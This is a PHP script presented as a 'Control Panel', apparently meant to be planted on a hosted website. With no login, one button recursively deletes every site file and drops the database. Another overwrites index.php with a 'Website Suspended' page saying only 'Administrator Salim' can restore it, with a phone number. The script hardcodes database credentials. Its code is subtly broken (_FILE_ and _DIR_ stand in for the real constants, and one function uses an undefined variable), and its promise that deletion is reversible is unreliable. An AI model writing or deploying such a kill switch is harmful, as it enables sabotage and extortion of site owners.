<?php
session_start();

// ================== CONFIG ==================
$DB_HOST = 'localhost';
$DB_USER = 'shubhamc_selim';
$DB_PASS = 'shubhamc_selim';
$DB_NAME = 'shubhamc_selim';

$SELF_FILE = basename(_FILE_);
$TARGET_DIR = _DIR_;
$BACKUP_DIR = _DIR_ . '/.backup';
$SUSPEND_FILE = $TARGET_DIR . '/.suspend.lock';
$INDEX_FILE = $TARGET_DIR . '/index.php';

// ================== AUTO SUSPEND BLOCK ==================
if (
    php_sapi_name() !== 'cli' &&
    basename($_SERVER['PHP_SELF']) !== $SELF_FILE &&
    file_exists($SUSPEND_FILE)
) {
    if (!file_exists($INDEX_FILE)) {
        file_put_contents($INDEX_FILE, <<<PHP
<?php
echo "<!DOCTYPE html>
<html>
<head>
    <title>Suspended</title>
    <style>
        body {
            background-color: red;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 100px;
        }
        h1 {
            color: yellow;
            font-size: 36px;
        }
        p {
            font-size: 20px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>🚫 Website Suspended</h1>
    <p><strong style='color:red; background:white; padding:5px;'>Unsuspend Power Only Administrator Salim</strong></p>
    <p>📞 Contact: 9735073422</p>
</body>
</html>";
?>
PHP);
    }
    header("Location: index.php");
    exit;
}

// ================== HELPERS ==================
function backupFiles($from, $to, $self) {
    if (!is_dir($to)) mkdir($to, 0777, true);
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($from));
    foreach ($rii as $file) {
        if ($file->isDir()) continue;
        $src = $file->getPathname();
        if (strpos($src, basename($self)) !== false || strpos($src, '/.backup/') !== false) continue;
        $dst = str_replace($from, $to, $src);
        $dstDir = dirname($dst);
        if (!is_dir($dstDir)) mkdir($dstDir, 0777, true);
        @copy($src, $dst);
    }
}

function deleteFiles($dir, $self) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..' || $item === basename($self) || $item === basename($BACKUP_DIR)) continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteFiles($path, $self);
            @rmdir($path);
        } else {
            @unlink($path);
        }
    }
}

function restoreFiles($from, $to) {
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($from));
    foreach ($rii as $file) {
        if ($file->isDir()) continue;
        $src = $file->getPathname();
        $dst = str_replace($from, $to, $src);
        $dstDir = dirname($dst);
        if (!is_dir($dstDir)) mkdir($dstDir, 0777, true);
        @copy($src, $dst);
    }
}

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    if ($_POST['action'] === 'delete') {
        backupFiles($TARGET_DIR, $BACKUP_DIR, $SELF_FILE);
        deleteFiles($TARGET_DIR, $SELF_FILE);
        $conn = new mysqli($DB_HOST, $DB_USER, $DB_PASS);
        if (!$conn->connect_error && preg_match('/^[a-zA-Z0-9_]+$/', $DB_NAME)) {
            $conn->query("DROP DATABASE $DB_NAME");
        }
        $conn->close();
        $message = "✅ Files backed up and deleted. DB dropped.";
    } elseif ($_POST['action'] === 'cancel') {
        $message = "⏳ Restore will happen in 60 seconds...";
        echo "<meta http-equiv='refresh' content='60;url=?restore=1'>";
    } elseif ($_POST['suspend_action'] === 'suspend') {
        file_put_contents($SUSPEND_FILE, "1");
        file_put_contents($INDEX_FILE, <<<PHP
<?php
echo "<!DOCTYPE html>
<html>
<head>
    <title>Suspended</title>
    <style>
        body {
            background-color: red;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 100px;
        }
        h1 {
            color: yellow;
            font-size: 36px;
        }
        p {
            font-size: 20px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>🚫 Website Suspended</h1>
    <p><strong style='color:red; background:white; padding:5px;'>Unsuspend Power Only Administrator Salim</strong></p>
    <p>📞 Contact: 9735073422</p>
</body>
</html>";
?>
PHP);
        $message = "🚫 Website Suspended.";
    } elseif ($_POST['suspend_action'] === 'resume') {
        if (file_exists($SUSPEND_FILE)) unlink($SUSPEND_FILE);
        if (file_exists($INDEX_FILE)) unlink($INDEX_FILE);
        $message = "✅ Website Resumed.";
    }
}

if (isset($_GET['restore']) && is_dir($BACKUP_DIR)) {
    restoreFiles($BACKUP_DIR, $TARGET_DIR);
    $message = "✅ Files restored from backup.";
    deleteFiles($BACKUP_DIR, '');
    @rmdir($BACKUP_DIR);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f8f9fa; }
        .btn { padding: 12px 30px; font-size: 16px; margin: 10px; border: none; border-radius: 5px; cursor: pointer; color: #fff; }
        .delete-btn { background-color: #d9534f; }
        .cancel-btn { background-color: #5bc0de; }
        .suspend-btn { background-color: #f0ad4e; }
        .resume-btn { background-color: #5cb85c; }
        .message { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; padding: 15px; margin: 20px auto; width: fit-content; border-radius: 5px; }
    </style>
</head>
<body>
    <h2>⚠ Delete All Files & Database</h2>
    <p><strong>This action is reversible in 60 seconds!</strong></p>

    <?php if ($message): ?><div class="message"><?= $message ?></div><?php endif; ?>

    <form method="POST">
        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
        <button class="btn delete-btn" name="action" value="delete" type="submit">YES, DELETE</button>
        <button class="btn cancel-btn" name="action" value="cancel" type="submit">NO, CANCEL</button>
    </form>

    <hr style="margin: 40px 0;">

    <h3>🛑 Website Suspension Control</h3>
    <form method="POST">
        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
        <button class="btn suspend-btn" name="suspend_action" value="suspend" type="submit">Suspend Website</button>
        <button class="btn resume-btn" name="suspend_action" value="resume" type="submit">Resume Website</button>
    </form>
</body>
</html>